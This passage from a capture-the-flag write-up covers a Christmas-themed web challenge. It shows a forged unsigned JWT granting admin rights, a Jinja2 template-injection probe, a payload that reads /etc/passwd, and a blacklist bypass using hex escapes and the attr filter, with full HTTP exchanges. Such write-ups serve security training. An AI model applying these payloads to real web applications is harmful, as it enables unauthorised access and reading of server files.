Analyzing the code you will understand that variables are populated from Santa's data, that data is well known except its secret.

```python
adminPrivileges = [[None]*3]*500

adminPrivileges [0][0] = 0 # UID
adminPrivileges [0][1] = ""Santa"" #Uname
adminPrivileges [0][2] = SantaSecret
```

* `str(uid)` is `0`;
* `usr` is `Santa`;
* `pss` is the unknown `SantaSecret`;
* `userpss` can be set following the `step=1` procedure of the `/authorize` endpoint, so it can be forced.

At this point I was stuck and I was not able to bypass this check, so I did something (stupid, lol) that led me to what I think was an **unintended solution** to bypass the check: I registered a user with username `Santa`.

The user with username `Santa` was already into `adminPrivileges`, so I only crafted the correct JWT to bypass the previous check and I added the `pass` field needed by the `/makehat` endpoint.

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0eXBlIjoidXNlciIsInVzZXIiOiJTYW50YSJ9.zTPHtZUj9Avd1XXpM6T0nnLl7x9QeuSqaqB5ClMH8gk

{""typ"":""JWT"",""alg"":""HS256""}.{""type"":""user"",""user"":""Santa""}.zTPHtZUj9Avd1XXpM6T0nnLl7x9QeuSqaqB5ClMH8gk

{""typ"":""JWT"",""alg"":""none""}.{""type"":""admin"",""user"":""Santa"",""pass"":""password""}.

eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ0eXBlIjoiYWRtaW4iLCJ1c2VyIjoiU2FudGEiLCJwYXNzIjoiTWtvMDlpam4ifQ.
```

Here the request to the endpoint.

```
GET /makehat?hatName=test HTTP/1.1
Host: challs.xmas.htsp.ro:11005
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://challs.xmas.htsp.ro:11005/register
Connection: close
Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ0eXBlIjoiYWRtaW4iLCJ1c2VyIjoiU2FudGEiLCJwYXNzIjoiTWtvMDlpam4ifQ.
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0

HTTP/1.1 200 OK
Server: nginx
Date: Thu, 19 Dec 2019 00:03:09 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 459
Connection: close

<head>
	<link rel=""stylesheet"" type=""text/css"" href=""/static/css/styles.css"">
</head>

<body>
	<div class=""navbar"">
<a style=""float: left"" href=""/"">Home</a>

	<a href=""/login"">Login</a>
	<a href=""/register"">Register</a>

</div>
	<div class=""container"" style=""text-align:center"">
		<img class=""hat"" src=""/static/img/hats/7.png"">
		<h1>You are viewing:<br><span style=""color:#FFA144;"">test</span></h1>
	</div>
</body>

<script src=""/static/js/snow.js""></script>
```

Trying the auth token to the homepage will confirm our privileges.

```
GET / HTTP/1.1
Host: challs.xmas.htsp.ro:11005
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ0eXBlIjoiYWRtaW4iLCJ1c2VyIjoiU2FudGEiLCJwYXNzIjoiTWtvMDlpam4ifQ.
Upgrade-Insecure-Requests: 1

HTTP/1.1 200 OK
Server: nginx
Date: Thu, 19 Dec 2019 00:06:49 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 971
Connection: close

<head>
	<link rel=""stylesheet"" type=""text/css"" href=""/static/css/styles.css"">
</head>

<body>
	<div class=""navbar"">
<a style=""float: left"" href=""/"">Home</a>

	<a href=""/logout"">Logout</a>

</div>
	<div class=""container"">
		
			<h1>Welcome <span style=""color: #A1FF44"">Santa</span>!</h1>
			
				
					<div>You are a Level 2 factory administrator. You may now test and create new hats. You can now oversee the factory workers:<br><br>
					<iframe width=""879"" height=""468"" src=""https://www.youtube.com/embed/QDCPKBF7a1Q"" frameborder=""0"" allow=""accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture"" allowfullscreen></iframe>
					<br><br>
					<form action=""/makehat"" method=""get"">
						<input placeholder=""Hat Name"" type=""text"" name=""hatName""><br>
					<input type=""submit"" value=""Make Hat!"">
					</form> 
				
				</div>
				<img class=""companion"" src=""/static/img/balloonicorn.png"">
			
		
	</div>
	<script src=""/static/js/snow.js""></script>
</body>
```

Trying the `{{7*7}}` payload to the `/makehat` endpoint will reveal a SSTI vulnerability.

```
GET /makehat?hatName=%7B%7B7%2A7%7D%7D HTTP/1.1
Host: challs.xmas.htsp.ro:11005
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://challs.xmas.htsp.ro:11005/register
Connection: close
Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ0eXBlIjoiYWRtaW4iLCJ1c2VyIjoiU2FudGEiLCJwYXNzIjoiTWtvMDlpam4ifQ.
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0

HTTP/1.1 200 OK
Server: nginx
Date: Thu, 19 Dec 2019 00:11:40 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 457
Connection: close

<head>
	<link rel=""stylesheet"" type=""text/css"" href=""/static/css/styles.css"">
</head>

<body>
	<div class=""navbar"">
<a style=""float: left"" href=""/"">Home</a>

	<a href=""/login"">Login</a>
	<a href=""/register"">Register</a>

</div>
	<div class=""container"" style=""text-align:center"">
		<img class=""hat"" src=""/static/img/hats/3.png"">
		<h1>You are viewing:<br><span style=""color:#FFA144;"">49</span></h1>
	</div>
</body>

<script src=""/static/js/snow.js""></script>
```

Usually, something like the following can be used to access classes loaded into the server and to invoke them.

```python
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
```

But we have some restrictions, as you can see in the following blacklist used into `/makehat` endpoint.

```python
blacklist = [""config"", ""self"", ""request"", ""["", ""]"", '""', ""_"", ""+"", "" "", ""join"", ""%"", ""%25""]
```

So we have to use some tricks like the hexadecimal encoding of the strings and the `attr` filter of Jinja2.

The following request can be used to enumerate all classes.

```
GET /makehat?hatName={{''|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fmro\x5f\x5f')|last|attr('\x5f\x5fsubclasses\x5f\x5f')()}} HTTP/1.1
Host: challs.xmas.htsp.ro:11005
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://challs.xmas.htsp.ro:11005/register
Connection: close
Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ0eXBlIjoiYWRtaW4iLCJ1c2VyIjoiU2FudGEiLCJwYXNzIjoiTWtvMDlpam4ifQ.
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0

HTTP/1.1 200 OK
Server: nginx
Date: Thu, 19 Dec 2019 00:30:39 GMT
Content-Type: text/html; charset=utf-8
Connection: close
Vary: Accept-Encoding
Content-Length: 36060

<head>
	<link rel=""stylesheet"" type=""text/css"" href=""/static/css/styles.css"">
</head>

<body>
	<div class=""navbar"">
<a style=""float: left"" href=""/"">Home</a>

	<a href=""/login"">Login</a>
	<a href=""/register"">Register</a>

</div>
	<div class=""container"" style=""text-align:center"">
		<img class=""hat"" src=""/static/img/hats/7.png"">
		<h1>You are viewing:<br><span style=""color:#FFA144;"">[&lt;class &#39;type&#39;&gt;, &lt;class &#39;weakref&#39;&gt;, &lt;class &#39;weakcallableproxy&#39;&gt;, &lt;class &#39;weakproxy&#39;&gt;, &lt;class &#39;int&#39;&gt;, &lt;class &#39;bytearray&#39;&gt;, &lt;class &#39;bytes&#39;&gt;, &lt;class &#39;list&#39;&gt;, &lt;class &#39;NoneType&#39;&gt;, &lt;class &#39;NotImplementedType&#39;&gt;, &lt;class &#39;traceback&#39;&gt;, &lt;class &#39;super&#39;&gt;, &lt;class &#39;range&#39;&gt;, &lt;class &#39;dict&#39;&gt;, &lt;class &#39;dict_keys&#39;&gt;, &lt;class &#39;dict_values&#39;&gt;, &lt;class &#39;dict_items&#39;&gt;, &lt;class &#39;odict_iterator&#39;&gt;, &lt;class &#39;set&#39;&gt;, &lt;class &#39;str&#39;&gt;, &lt;class &#39;slice&#39;&gt;, &lt;class &#39;staticmethod&#39;&gt;, &lt;class &#39;complex&#39;&gt;, &lt;class &#39;float&#39;&gt;, &lt;class &#39;frozenset&#39;&gt;, &lt;class &#39;property&#39;&gt;, &lt;class &#39;managedbuffer&#39;&gt;, &lt;class &#39;memoryview&#39;&gt;, &lt;class &#39;tuple&#39;&gt;, &lt;class &#39;enumerate&#39;&gt;, &lt;class &#39;reversed&#39;&gt;, &lt;class &#39;stderrprinter&#39;&gt;, &lt;class &#39;code&#39;&gt;, &lt;class &#39;frame&#39;&gt;, &lt;class &#39;builtin_function_or_method&#39;&gt;, &lt;class &#39;method&#39;&gt;, &lt;class &#39;function&#39;&gt;, &lt;class &#39;mappingproxy&#39;&gt;, &lt;class &#39;generator&#39;&gt;, &lt;class &#39;getset_descriptor&#39;&gt;, &lt;class &#39;wrapper_descriptor&#39;&gt;, &lt;class &#39;method-wrapper&#39;&gt;, &lt;class &#39;ellipsis&#39;&gt;, &lt;class &#39;member_descriptor&#39;&gt;, &lt;class &#39;types.SimpleNamespace&#39;&gt;, &lt;class &#39;PyCapsule&#39;&gt;, &lt;class &#39;longrange_iterator&#39;&gt;, &lt;class &#39;cell&#39;&gt;, &lt;class &#39;instancemethod&#39;&gt;, &lt;class &#39;classmethod_descriptor&#39;&gt;, &lt;class &#39;method_descriptor&#39;&gt;, &lt;class &#39;callable_iterator&#39;&gt;, &lt;class &#39;iterator&#39;&gt;, &lt;class &#39;coroutine&#39;&gt;, &lt;class &#39;coroutine_wrapper&#39;&gt;, &lt;class &#39;moduledef&#39;&gt;, &lt;class &#39;module&#39;&gt;, &lt;class &#39;EncodingMap&#39;&gt;, &lt;class &#39;fieldnameiterator&#39;&gt;, &lt;class &#39;formatteriterator&#39;&gt;, &lt;class &#39;filter&#39;&gt;, &lt;class &#39;map&#39;&gt;, &lt;class &#39;zip&#39;&gt;, &lt;class &#39;BaseException&#39;&gt;, &lt;class &#39;hamt&#39;&gt;, &lt;class &#39;hamt_array_node&#39;&gt;, &lt;class &#39;hamt_bitmap_node&#39;&gt;, &lt;class &#39;hamt_collision_node&#39;&gt;, &lt;class &#39;keys&#39;&gt;, &lt;class &#39;values&#39;&gt;, &lt;class &#39;items&#39;&gt;, &lt;class &#39;Context&#39;&gt;, &lt;class &#39;ContextVar&#39;&gt;, &lt;class &#39;Token&#39;&gt;, &lt;class &#39;Token.MISSING&#39;&gt;, &lt;class &#39;_frozen_importlib._ModuleLock&#39;&gt;, &lt;class &#39;_frozen_importlib._DummyModuleLock&#39;&gt;, &lt;class &#39;_frozen_importlib._ModuleLockManager&#39;&gt;, &lt;class &#39;_frozen_importlib._installed_safely&#39;&gt;, &lt;class &#39;_frozen_importlib.ModuleSpec&#39;&gt;, &lt;class &#39;_frozen_importlib.BuiltinImporter&#39;&gt;, &lt;class &#39;classmethod&#39;&gt;, &lt;class &#39;_frozen_importlib.FrozenImporter&#39;&gt;, &lt;class &#39;_frozen_importlib._ImportLockContext&#39;&gt;, &lt;class &#39;_thread._localdummy&#39;&gt;, &lt;class &#39;_thread._local&#39;&gt;, &lt;class &#39;_thread.lock&#39;&gt;, &lt;class &#39;_thread.RLock&#39;&gt;, &lt;class &#39;zipimport.zipimporter&#39;&gt;, &lt;class &#39;_frozen_importlib_external.WindowsRegistryFinder&#39;&gt;, &lt;class &#39;_frozen_importlib_external._LoaderBasics&#39;&gt;, &lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt;, &lt;class &#39;_frozen_importlib_external._NamespacePath&#39;&gt;, &lt;class &#39;_frozen_importlib_external._NamespaceLoader&#39;&gt;, &lt;class &#39;_frozen_importlib_external.PathFinder&#39;&gt;, &lt;class &#39;_frozen_importlib_external.FileFinder&#39;&gt;, &lt;class &#39;_io._IOBase&#39;&gt;, &lt;class &#39;_io._BytesIOBuffer&#39;&gt;, &lt;class &#39;_io.IncrementalNewlineDecoder&#39;&gt;, &lt;class &#39;posix.ScandirIterator&#39;&gt;, &lt;class &#39;posix.DirEntry&#39;&gt;, &lt;class &#39;codecs.Codec&#39;&gt;, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &lt;class &#39;codecs.StreamReaderWriter&#39;&gt;, &lt;class &#39;codecs.StreamRecoder&#39;&gt;, &lt;class &#39;_abc_data&#39;&gt;, &lt;class &#39;abc.ABC&#39;&gt;, &lt;class &#39;dict_itemiterator&#39;&gt;, &lt;class &#39;collections.abc.Hashable&#39;&gt;, &lt;class &#39;collections.abc.Awaitable&#39;&gt;, &lt;class &#39;collections.abc.AsyncIterable&#39;&gt;, &lt;class &#39;async_generator&#39;&gt;, &lt;class &#39;collections.abc.Iterable&#39;&gt;, &lt;class &#39;bytes_iterator&#39;&gt;, &lt;class &#39;bytearray_iterator&#39;&gt;, &lt;class &#39;dict_keyiterator&#39;&gt;, &lt;class &#39;dict_valueiterator&#39;&gt;, &lt;class &#39;list_iterator&#39;&gt;, &lt;class &#39;list_reverseiterator&#39;&gt;, &lt;class &#39;range_iterator&#39;&gt;, &lt;class &#39;set_iterator&#39;&gt;, &lt;class &#39;str_iterator&#39;&gt;, &lt;class &#39;tuple_iterator&#39;&gt;, &lt;class &#39;collections.abc.Sized&#39;&gt;, &lt;class &#39;collections.abc.Container&#39;&gt;, &lt;class &#39;collections.abc.Callable&#39;&gt;, &lt;class &#39;os._wrap_close&#39;&gt;, &lt;class &#39;_sitebuiltins.Quitter&#39;&gt;, &lt;class &#39;_sitebuiltins._Printer&#39;&gt;, &lt;class &#39;_sitebuiltins._Helper&#39;&gt;, &lt;class &#39;types.DynamicClassAttribute&#39;&gt;, &lt;class &#39;types._GeneratorWrapper&#39;&gt;, &lt;class &#39;collections.deque&#39;&gt;, &lt;class &#39;_collections._deque_iterator&#39;&gt;, &lt;class &#39;_collections._deque_reverse_iterator&#39;&gt;, &lt;class &#39;enum.auto&#39;&gt;, &lt;enum &#39;Enum&#39;&gt;, &lt;class &#39;re.Pattern&#39;&gt;, &lt;class &#39;re.Match&#39;&gt;, &lt;class &#39;_sre.SRE_Scanner&#39;&gt;, &lt;class &#39;sre_parse.Pattern&#39;&gt;, &lt;class &#39;sre_parse.SubPattern&#39;&gt;, &lt;class &#39;sre_parse.Tokenizer&#39;&gt;, &lt;class &#39;functools.partial&#39;&gt;, &lt;class &#39;functools._lru_cache_wrapper&#39;&gt;, &lt;class &#39;operator.itemgetter&#39;&gt;, &lt;class &#39;operator.attrgetter&#39;&gt;, &lt;class &#39;operator.methodcaller&#39;&gt;, &lt;class &#39;itertools.accumulate&#39;&gt;, &lt;class &#39;itertools.combinations&#39;&gt;, &lt;class &#39;itertools.combinations_with_replacement&#39;&gt;, &lt;class &#39;itertools.cycle&#39;&gt;, &lt;class &#39;itertools.dropwhile&#39;&gt;, &lt;class &#39;itertools.takewhile&#39;&gt;, &lt;class &#39;itertools.islice&#39;&gt;, &lt;class &#39;itertools.starmap&#39;&gt;, &lt;class &#39;itertools.chain&#39;&gt;, &lt;class &#39;itertools.compress&#39;&gt;, &lt;class &#39;itertools.filterfalse&#39;&gt;, &lt;class &#39;itertools.count&#39;&gt;, &lt;class &#39;itertools.zip_longest&#39;&gt;, &lt;class &#39;itertools.permutations&#39;&gt;, &lt;class &#39;itertools.product&#39;&gt;, &lt;class &#39;itertools.repeat&#39;&gt;, &lt;class &#39;itertools.groupby&#39;&gt;, &lt;class &#39;itertools._grouper&#39;&gt;, &lt;class &#39;itertools._tee&#39;&gt;, &lt;class &#39;itertools._tee_dataobject&#39;&gt;, &lt;class &#39;reprlib.Repr&#39;&gt;, &lt;class &#39;collections._Link&#39;&gt;, &lt;class &#39;functools.partialmethod&#39;&gt;, &lt;class &#39;re.Scanner&#39;&gt;, &lt;class &#39;__future__._Feature&#39;&gt;, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &lt;class &#39;importlib.abc.Finder&#39;&gt;, &lt;class &#39;importlib.abc.Loader&#39;&gt;, &lt;class &#39;importlib.abc.ResourceReader&#39;&gt;, &lt;class &#39;contextlib.ContextDecorator&#39;&gt;, &lt;class &#39;contextlib._GeneratorContextManagerBase&#39;&gt;, &lt;class &#39;contextlib._BaseExitStack&#39;&gt;, &lt;class &#39;zlib.Compress&#39;&gt;, &lt;class &#39;zlib.Decompress&#39;&gt;, &lt;class &#39;tokenize.Untokenizer&#39;&gt;, &lt;class &#39;traceback.FrameSummary&#39;&gt;, &lt;class &#39;traceback.TracebackException&#39;&gt;, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &lt;class &#39;threading._RLock&#39;&gt;, &lt;class &#39;threading.Condition&#39;&gt;, &lt;class &#39;threading.Semaphore&#39;&gt;, &lt;class &#39;threading.Event&#39;&gt;, &lt;class &#39;threading.Barrier&#39;&gt;, &lt;class &#39;threading.Thread&#39;&gt;, &lt;class &#39;_bz2.BZ2Compressor&#39;&gt;, &lt;class &#39;_bz2.BZ2Decompressor&#39;&gt;, &lt;class &#39;_lzma.LZMACompressor&#39;&gt;, &lt;class &#39;_lzma.LZMADecompressor&#39;&gt;, &lt;class &#39;Struct&#39;&gt;, &lt;class &#39;unpack_iterator&#39;&gt;, &lt;class &#39;zipfile.ZipInfo&#39;&gt;, &lt;class &#39;zipfile.LZMACompressor&#39;&gt;, &lt;class &#39;zipfile.LZMADecompressor&#39;&gt;, &lt;class &#39;zipfile._SharedFile&#39;&gt;, &lt;class &#39;zipfile._Tellable&#39;&gt;, &lt;class &#39;zipfile.ZipFile&#39;&gt;, &lt;class &#39;weakref.finalize._Info&#39;&gt;, &lt;class &#39;weakref.finalize&#39;&gt;, &lt;class &#39;pkgutil.ImpImporter&#39;&gt;, &lt;class &#39;pkgutil.ImpLoader&#39;&gt;, &lt;class &#39;select.poll&#39;&gt;, &lt;class &#39;select.epoll&#39;&gt;, &lt;class &#39;selectors.BaseSelector&#39;&gt;, &lt;class &#39;subprocess.CompletedProcess&#39;&gt;, &lt;class &#39;subprocess.Popen&#39;&gt;, &lt;class &#39;datetime.date&#39;&gt;, &lt;class &#39;datetime.timedelta&#39;&gt;, &lt;class &#39;datetime.time&#39;&gt;, &lt;class &#39;datetime.tzinfo&#39;&gt;, &lt;class &#39;pyexpat.xmlparser&#39;&gt;, &lt;class &#39;plistlib.Data&#39;&gt;, &lt;class &#39;plistlib._PlistParser&#39;&gt;, &lt;class &#39;plistlib._DumbXMLWriter&#39;&gt;, &lt;class &#39;plistlib._BinaryPlistParser&#39;&gt;, &lt;class &#39;plistlib._BinaryPlistWriter&#39;&gt;, &lt;class &#39;string.Template&#39;&gt;, &lt;class &#39;string.Formatter&#39;&gt;, &lt;class &#39;email.charset.Charset&#39;&gt;, &lt;class &#39;email.header.Header&#39;&gt;, &lt;class &#39;email.header._ValueFormatter&#39;&gt;, &lt;class &#39;_hashlib.HASH&#39;&gt;, &lt;class &#39;_blake2.blake2b&#39;&gt;, &lt;class &#39;_blake2.blake2s&#39;&gt;, &lt;class &#39;_sha3.sha3_224&#39;&gt;, &lt;class &#39;_sha3.sha3_256&#39;&gt;, &lt;class &#39;_sha3.sha3_384&#39;&gt;, &lt;class &#39;_sha3.sha3_512&#39;&gt;, &lt;class &#39;_sha3.shake_128&#39;&gt;, &lt;class &#39;_sha3.shake_256&#39;&gt;, &lt;class &#39;_random.Random&#39;&gt;, &lt;class &#39;_socket.socket&#39;&gt;, &lt;class &#39;urllib.parse._ResultMixinStr&#39;&gt;, &lt;class &#39;urllib.parse._ResultMixinBytes&#39;&gt;, &lt;class &#39;urllib.parse._NetlocResultMixinBase&#39;&gt;, &lt;class &#39;calendar._localized_month&#39;&gt;, &lt;class &#39;calendar._localized_day&#39;&gt;, &lt;class &#39;calendar.Calendar&#39;&gt;, &lt;class &#39;calendar.different_locale&#39;&gt;, &lt;class &#39;email._parseaddr.AddrlistClass&#39;&gt;, &lt;class &#39;email._policybase._PolicyBase&#39;&gt;, &lt;class &#39;email.feedparser.BufferedSubFile&#39;&gt;, &lt;class &#39;email.feedparser.FeedParser&#39;&gt;, &lt;class &#39;email.parser.Parser&#39;&gt;, &lt;class &#39;email.parser.BytesParser&#39;&gt;, &lt;class &#39;tempfile._RandomNameSequence&#39;&gt;, &lt;class &#39;tempfile._TemporaryFileCloser&#39;&gt;, &lt;class &#39;tempfile._TemporaryFileWrapper&#39;&gt;, &lt;class &#39;tempfile.SpooledTemporaryFile&#39;&gt;, &lt;class &#39;tempfile.TemporaryDirectory&#39;&gt;, &lt;class &#39;textwrap.TextWrapper&#39;&gt;, &lt;class &#39;dis.Bytecode&#39;&gt;, &lt;class &#39;inspect.BlockFinder&#39;&gt;, &lt;class &#39;inspect._void&#39;&gt;, &lt;class &#39;inspect._empty&#39;&gt;, &lt;class &#39;inspect.Parameter&#39;&gt;, &lt;class &#39;inspect.BoundArguments&#39;&gt;, &lt;class &#39;inspect.Signature&#39;&gt;, &lt;class &#39;pkg_resources.extern.VendorImporter&#39;&gt;, &lt;class &#39;pkg_resources._vendor.six._LazyDescr&#39;&gt;, &lt;class &#39;pkg_resources._vendor.six._SixMetaPathImporter&#39;&gt;, &lt;class &#39;pkg_resources._vendor.six._LazyDescr&#39;&gt;, &lt;class &#39;pkg_resources._vendor.six._SixMetaPathImporter&#39;&gt;, &lt;class &#39;pkg_resources._vendor.appdirs.AppDirs&#39;&gt;, &lt;class &#39;pkg_resources.extern.packaging._structures.Infinity&#39;&gt;, &lt;class &#39;pkg_resources.extern.packaging._structures.NegativeInfinity&#39;&gt;, &lt;class &#39;pkg_resources.extern.packaging.version._BaseVersion&#39;&gt;, &lt;class &#39;pkg_resources.extern.packaging.specifiers.BaseSpecifier&#39;&gt;, &lt;class &#39;pprint._safe_key&#39;&gt;, &lt;class &#39;pprint.PrettyPrinter&#39;&gt;, &lt;class &#39;pkg_resources._vendor.pyparsing._Constants&#39;&gt;, &lt;class &#39;pkg_resources._vendor.pyparsing._ParseResultsWithOffset&#39;&gt;, &lt;class &#39;pkg_resources._vendor.pyparsing.ParseResults&#39;&gt;, &lt;class &#39;pkg_resources._vendor.pyparsing.ParserElement._UnboundedCache&#39;&gt;, &lt;class &#39;pkg_resources._vendor.pyparsing.ParserElement._FifoCache&#39;&gt;, &lt;class &#39;pkg_resources._vendor.pyparsing.ParserElement&#39;&gt;, &lt;class &#39;pkg_resources._vendor.pyparsing._NullToken&#39;&gt;, &lt;class &#39;pkg_resources._vendor.pyparsing.OnlyOnce&#39;&gt;, &lt;class &#39;pkg_resources._vendor.pyparsing.pyparsing_common&#39;&gt;, &lt;class &#39;pkg_resources.extern.packaging.markers.Node&#39;&gt;, &lt;class &#39;pkg_resources.extern.packaging.markers.Marker&#39;&gt;, &lt;class &#39;pkg_resources.extern.packaging.requirements.Requirement&#39;&gt;, &lt;class &#39;pkg_resources.IMetadataProvider&#39;&gt;, &lt;class &#39;pkg_resources.WorkingSet&#39;&gt;, &lt;class &#39;pkg_resources.Environment&#39;&gt;, &lt;class &#39;pkg_resources.ResourceManager&#39;&gt;, &lt;class &#39;pkg_resources.NullProvider&#39;&gt;, &lt;class &#39;pkg_resources.NoDists&#39;&gt;, &lt;class &#39;pkg_resources.EntryPoint&#39;&gt;, &lt;class &#39;pkg_resources.Distribution&#39;&gt;, &lt;class &#39;gunicorn.six._LazyDescr&#39;&gt;, &lt;class &#39;gunicorn.six._SixMetaPathImporter&#39;&gt;, &lt;class &#39;logging.LogRecord&#39;&gt;, &lt;class &#39;logging.PercentStyle&#39;&gt;, &lt;class &#39;logging.Formatter&#39;&gt;, &lt;class &#39;logging.BufferingFormatter&#39;&gt;, &lt;class &#39;logging.Filter&#39;&gt;, &lt;class &#39;logging.Filterer&#39;&gt;, &lt;class &#39;logging.PlaceHolder&#39;&gt;, &lt;class &#39;logging.Manager&#39;&gt;, &lt;class &#39;logging.LoggerAdapter&#39;&gt;, &lt;class &#39;gunicorn.pidfile.Pidfile&#39;&gt;, &lt;class &#39;gunicorn.sock.BaseSocket&#39;&gt;, &lt;class &#39;gunicorn.arbiter.Arbiter&#39;&gt;, &lt;class &#39;gettext.NullTranslations&#39;&gt;, &lt;class &#39;argparse._AttributeHolder&#39;&gt;, &lt;class &#39;argparse.HelpFormatter._Section&#39;&gt;, &lt;class &#39;argparse.HelpFormatter&#39;&gt;, &lt;class &#39;argparse.FileType&#39;&gt;, &lt;class &#39;argparse._ActionsContainer&#39;&gt;, &lt;class &#39;_ssl._SSLContext&#39;&gt;, &lt;class &#39;_ssl._SSLSocket&#39;&gt;, &lt;class &#39;_ssl.MemoryBIO&#39;&gt;, &lt;class &#39;_ssl.Session&#39;&gt;, &lt;class &#39;ssl.SSLObject&#39;&gt;, &lt;class &#39;shlex.shlex&#39;&gt;, &lt;class &#39;gunicorn.reloader.InotifyReloader&#39;&gt;, &lt;class &#39;gunicorn.config.Config&#39;&gt;, &lt;class &#39;gunicorn.config.Setting&#39;&gt;, &lt;class &#39;gunicorn.debug.Spew&#39;&gt;, &lt;class &#39;gunicorn.app.base.BaseApplication&#39;&gt;, &lt;class &#39;pickle._Framer&#39;&gt;, &lt;class &#39;pickle._Unframer&#39;&gt;, &lt;class &#39;pickle._Pickler&#39;&gt;, &lt;class &#39;pickle._Unpickler&#39;&gt;, &lt;class &#39;_pickle.Unpickler&#39;&gt;, &lt;class &#39;_pickle.Pickler&#39;&gt;, &lt;class &#39;_pickle.Pdata&#39;&gt;, &lt;class &#39;_pickle.PicklerMemoProxy&#39;&gt;, &lt;class &#39;_pickle.UnpicklerMemoProxy&#39;&gt;, &lt;class &#39;_queue.SimpleQueue&#39;&gt;, &lt;class &#39;queue.Queue&#39;&gt;, &lt;class &#39;queue._PySimpleQueue&#39;&gt;, &lt;class &#39;logging.handlers.QueueListener&#39;&gt;, &lt;class &#39;socketserver.BaseServer&#39;&gt;, &lt;class &#39;socketserver.ForkingMixIn&#39;&gt;, &lt;class &#39;socketserver.ThreadingMixIn&#39;&gt;, &lt;class &#39;socketserver.BaseRequestHandler&#39;&gt;, &lt;class &#39;logging.config.ConvertingMixin&#39;&gt;, &lt;class &#39;logging.config.BaseConfigurator&#39;&gt;, &lt;class &#39;gunicorn.glogging.Logger&#39;&gt;, &lt;class &#39;gunicorn.http.unreader.Unreader&#39;&gt;, &lt;class &#39;gunicorn.http.body.ChunkedReader&#39;&gt;, &lt;class &#39;gunicorn.http.body.LengthReader&#39;&gt;, &lt;class &#39;gunicorn.http.body.EOFReader&#39;&gt;, &lt;class &#39;gunicorn.http.body.Body&#39;&gt;, &lt;class &#39;gunicorn.http.message.Message&#39;&gt;, &lt;class &#39;gunicorn.http.parser.Parser&#39;&gt;, &lt;class &#39;gunicorn.http.wsgi.FileWrapper&#39;&gt;, &lt;class &#39;gunicorn.http.wsgi.Response&#39;&gt;, &lt;class &#39;gunicorn.workers.workertmp.WorkerTmp&#39;&gt;, &lt;class &#39;gunicorn.workers.base.Worker&#39;&gt;, &lt;class &#39;concurrent.futures._base._Waiter&#39;&gt;, &lt;class &#39;concurrent.futures._base._AcquireFutures&#39;&gt;, &lt;class &#39;concurrent.futures._base.Future&#39;&gt;, &lt;class &#39;concurrent.futures._base.Executor&#39;&gt;, &lt;class &#39;asyncio.coroutines.CoroWrapper&#39;&gt;, &lt;class &#39;asyncio.events.Handle&#39;&gt;, &lt;class &#39;asyncio.events.AbstractServer&#39;&gt;, &lt;class &#39;asyncio.events.AbstractEventLoop&#39;&gt;, &lt;class &#39;asyncio.events.AbstractEventLoopPolicy&#39;&gt;, &lt;class &#39;_asyncio.Future&#39;&gt;, &lt;class &#39;_asyncio.FutureIter&#39;&gt;, &lt;class &#39;TaskStepMethWrapper&#39;&gt;, &lt;class &#39;TaskWakeupMethWrapper&#39;&gt;, &lt;class &#39;_RunningLoopHolder&#39;&gt;, &lt;class &#39;asyncio.futures.Future&#39;&gt;, &lt;class &#39;asyncio.protocols.BaseProtocol&#39;&gt;, &lt;class &#39;asyncio.transports.BaseTransport&#39;&gt;, &lt;class &#39;asyncio.sslproto._SSLPipe&#39;&gt;, &lt;class &#39;asyncio.locks._ContextManager&#39;&gt;, &lt;class &#39;asyncio.locks._ContextManagerMixin&#39;&gt;, &lt;class &#39;asyncio.locks.Event&#39;&gt;, &lt;class &#39;asyncio.queues.Queue&#39;&gt;, &lt;class &#39;asyncio.streams.StreamWriter&#39;&gt;, &lt;class &#39;asyncio.streams.StreamReader&#39;&gt;, &lt;class &#39;asyncio.subprocess.Process&#39;&gt;, &lt;class &#39;asyncio.unix_events.AbstractChildWatcher&#39;&gt;, &lt;class &#39;gunicorn.selectors.BaseSelector&#39;&gt;, &lt;class &#39;gunicorn.workers.gthread.TConn&#39;&gt;, &lt;class &#39;concurrent.futures.thread._WorkItem&#39;&gt;, &lt;class 